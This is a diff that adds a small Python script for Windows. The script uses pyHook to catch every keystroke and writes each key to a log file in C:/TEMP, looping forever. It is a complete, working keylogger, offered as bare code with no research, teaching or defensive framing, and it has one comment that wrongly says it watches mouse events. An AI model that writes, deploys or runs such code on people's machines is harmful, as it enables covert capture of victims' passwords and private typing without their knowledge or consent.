@@ -1,0 +1,22 @@
+import pythoncom, pyHook, logging, os.path
+
+def OnKeyboardEvent(event):
+    logging.warning(str(event.Key))
+
+# return True to pass the event to other handlers
+    return True
+
+if not os.path.exists('C:/TEMP'):
+    os.makedirs('C:/TEMP')
+    open('C:/TEMP/log.log','a').close()
+
+logging.basicConfig(filename='C:/TEMP/log.log',format='%(message)s')
+
+# create a hook manager
+hm = pyHook.HookManager()
+# watch for all mouse events
+hm.KeyDown = OnKeyboardEvent
+# set the hook
+hm.HookKeyboard()
+# wait forever
+pythoncom.PumpMessages()
